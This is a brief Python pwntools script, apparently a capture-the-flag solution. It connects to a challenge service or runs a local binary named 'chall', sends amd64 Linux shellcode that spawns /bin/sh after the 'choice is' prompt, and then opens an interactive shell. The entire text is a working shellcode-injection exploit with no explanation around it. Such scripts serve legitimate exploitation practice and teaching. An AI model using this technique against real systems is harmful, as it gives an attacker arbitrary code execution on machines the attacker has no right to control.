from pwn import *

if args.REMOTE:
    io = remote('0.0.0.0', 1233)
else:   
    io = process('./chall')

payload = asm(shellcraft.amd64.linux.sh(), arch="x86_64")

io.recvuntil('choice is')
io.sendline(payload)

io.interactive()